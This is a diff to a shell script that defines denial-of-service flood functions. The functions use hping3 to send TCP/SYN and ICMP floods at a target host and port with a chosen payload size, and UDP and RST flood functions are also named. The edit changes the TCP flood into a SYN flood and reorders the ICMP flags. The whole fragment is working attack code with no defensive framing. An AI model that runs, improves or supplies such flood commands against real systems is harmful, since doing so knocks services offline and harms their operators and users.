@@ -44,14 +44,14 @@ udp_flood() {
 # Function to perform TCP flood attack
 tcp_flood() {
     echo "Starting TCP flood attack on $1 on port $2 with $3 bytes of data..."
-    sudo hping3 --flood -p $2 -d $3 $1
+    sudo hping3 -S $1 -p $2 -d $3 $1 --flood
 }
 
 # Function to perform ICMP flood attack
 icmp_flood() {
     echo "Starting ICMP flood attack on $1 on port $2 with $3 bytes of data..."
     # Note: ICMP doesn't actually use ports, but the port variable is kept for consistency
-    sudo hping3 --icmp --flood -d $3 $1
+    sudo hping3 --flood --icmp -d $3 $1
 }
 
 # Function to perform RST flood attack
